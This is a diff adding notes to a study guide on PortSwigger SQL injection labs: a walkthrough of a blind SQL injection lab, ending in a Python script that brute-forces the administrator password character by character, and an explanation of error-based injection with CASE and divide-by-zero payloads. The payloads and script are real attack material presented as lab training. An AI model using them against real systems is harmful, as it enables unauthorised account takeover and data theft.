@@ -1151,16 +1151,233 @@ The database contains a different table `users`, with columns called `username` 
 
 >Note: You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
+![Open lab 0.9](images/lab-0.9-blind-conditional-responses/open-lab-0.9.png)
+
+![Click My account 0.9](images/lab-0.9-blind-conditional-responses/go-my-login-0.9.png)
+
+![Check history /login from my account for get request and send repeater 0.9](images/lab-0.9-blind-conditional-responses/send-repeater-0.9.png)
+
+![In repeater see cookie parameter 0.9](images/lab-0.9-blind-conditional-responses/test-request-normal-0.9.png)
+
+![Test single quote to see error blind welcome back 0.9](images/lab-0.9-blind-conditional-responses/test-single-quote-welcome-back-0.9.png)
+
+![Test comment syntax 0.9](images/lab-0.9-blind-conditional-responses/test-comment-0.9.png)
+
+![Verify users table 0.9](images/lab-0.9-blind-conditional-responses/verify-users-table-0.9.png)
+
+![Test password length > 1 0.9](images/lab-0.9-blind-conditional-responses/test-length-gt-1-0.9.png)
+
+![Test password length > 15 0.9](images/lab-0.9-blind-conditional-responses/test-length-gt-15-0.9.png)
+
+![Test password length > 20 0.9](images/lab-0.9-blind-conditional-responses/test-length-gt-20-0.9.png)
+
+![In password length result have a > 19 0.9](images/lab-0.9-blind-conditional-responses/test-length-gt-19-0.9.png)
+
+![Substring extraction progress 0.9](images/lab-0.9-blind-conditional-responses/test-substring-progress-0.9.png)
+
+![Python script 0.9](images/lab-0.9-blind-conditional-responses/python-script-0.9.png)
+
+![Run python script 0.9](images/lab-0.9-blind-conditional-responses/run-python-script-0.9.png)
+
+![Login as administrator 0.9](images/lab-0.9-blind-conditional-responses/login-administrator-0.9.png)
+
+![Lab solved 0.9](images/lab-0.9-blind-conditional-responses/lab-solved-0.9.png)
+
 ##### Tutorial
 
+1. **Intercept the Login Request**
 
+   Open the lab page and intercept the `GET /login` request using Burp Suite. Once intercepted, send the request to **Repeater** for further testing.
+
+2. **Test for SQL Injection**
+
+   Check whether the `TrackingId` cookie parameter is vulnerable to SQL injection by appending a single quote (`'`) to its value:
+
+   ```http
+   TrackingId=7Itm5DEgpF70MXu9'
+   ```
+
+   If the `Welcome back!` message disappears after adding the single quote, it indicates that the input is affecting the SQL query.
+
+3. **Determine the SQL Comment Syntax**
+
+   Append the SQL comment syntax `--+` to terminate the remaining part of the original query:
+
+   ```http
+   TrackingId=7Itm5DEgpF70MXu9'--+
+   ```
+
+   If the `Welcome back!` message reappears, it confirms that the injection is working and that `--+` successfully comments out the remaining SQL statement.
+
+4. **Verify the Existence of the `users` Table**
+
+   Test whether the `users` table exists by using a static condition:
+
+   ```sql
+   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT 'a' FROM users LIMIT 1)='a'--+
+   ```
+
+   If the `Welcome back!` message appears, it indicates that the `users` table exists and that the SQL condition can be controlled.
+
+5. **Determine the Administrator Password Length**
+
+   Use the SQL `LENGTH()` function to determine the length of the administrator's password.
+
+   Start with a relatively high number, then gradually decrease it until the condition evaluates to true:
+
+   ```sql
+   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'--+
+   ```
+
+   ```sql
+   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a'--+
+   ```
+
+   In this test, the condition `LENGTH(password)>19` returns the `Welcome back!` message, while `LENGTH(password)>20` does not.
+
+   Therefore, the administrator's password is **20 characters long**.
+
+6. **Extract the Password Using `SUBSTRING()`**
+
+   Use the SQL `SUBSTRING()` function to retrieve the password one character at a time.
+
+   Change the first numeric argument to specify the character position and replace `'a'` with the character you want to test.
+
+   For the first character:
+
+   ```sql
+   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--+
+   ```
+
+   For the second character:
+
+   ```sql
+   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a'--+
+   ```
+
+   If the `Welcome back!` message appears, it means the tested character matches the character at that position.
+
+7. **Repeat the Process for All 20 Characters**
+
+   Repeat step 6 for positions 1 through 20 until all characters of the password have been identified.
+
+8. **Automate the Extraction Process with Python**
+
+   To speed up the process, automate the extraction using the following Python script:
+
+   ```python
+   import requests
+   import string
+
+   url = "https://0a10003803f349cf80be26a5007c00d1.web-security-academy.net/login"
+
+   tracking_id = "7Itm5DEgpF70MXu9"
+   session = "3mQEAdAHV0kDtdwEARtu43bCdwniet64"
+
+   chars = string.ascii_lowercase + string.digits
+   password = ""
+
+   for position in range(1, 21):
+       for char in chars:
+           cookies = {
+               "TrackingId": f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--+",
+               "session": session
+           }
+
+           response = requests.get(url, cookies=cookies)
+
+           if "Welcome back!" in response.text:
+               password += char
+               print(f"[+] {position}: {char} -> {password}")
+               break
+
+   print(f"\nPassword: {password}")
+   ```
+
+9. **Run the Python Script**
+
+   Install the required library:
+
+   ```bash
+   pip install requests
+   ```
+
+   Then execute the script:
+
+   ```bash
+   python blind-sql-injection-conditional-responses.py
+   ```
+
+10. **Log in as the Administrator**
+
+   Once the script has extracted all 20 characters, log in with the following credentials:
+
+   ```text
+   Username: administrator
+   Password: <extracted password>
+   ```
+
+11. **Complete the Lab**
+
+   If the login is successful, you'll gain access to the administrator account and the lab will be marked as **Solved**.
+
+<details>
+<summary> 24. Blind SQL Injection - How Does It Work? — z3nshell</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=W3zvXK9i75A
+Purpose: In this video we explain the concept of blind SQL injection and make use of the Burp Academy labs to provide an example of how this vulnerability is exploited. 
+</details>
+
+<details>
+<summary>25. SQL Injection - Lab #11 Blind SQL injection with conditional responses — Rana Khalil</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=LBG_n9fr8sM
+Purpose: This lab contains a blind SQL injection vulnerability. To solve the lab, we perform a blind based SQL injection attack on  the database that retrieves the password of the administrator user on the application.
+
+</details>
 
 </details>
 
 ## Error-based SQL injection
+
+Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:
+
+- You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in te same way as the conditional responses we looked at in the previous section. For more information. see Exploiting blind SQL injection by triggering conditional errors.
+- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see Extracting senstivie data via verbose SQL error messages.
+
 #### Exploiting blind SQL injection by triggering conditional errors
+
+Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting diffrenet boolean conditions makes no difference to the application's responses.
+
+It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.
+
 #### Exploiting blind SQL injection by triggering conditional errors - Continued
+
+To see how this works, suppose that two request are sent containing the following `TrackingId` cookie values in turn:
+
+```sql
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:
+
+- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
+- With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.
+
+if the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
+
+Using this technique, you can retrieve data by testing one character at a time:
+
+```sql
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1,1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+>Note: There are diffrent ways of triggering conditional erros, and different techniques work best on different database types. For more details, see the SQL injection cheat sheet.
+
 ##### Lab: Blind SQL injection with conditional errors
+
+
 #### Extracting sensitive data via verbose SQL error messages
 #### Extracting sensitive data via verbose SQL error messages - Continued
 ##### Lab: Visible error-based SQL injection
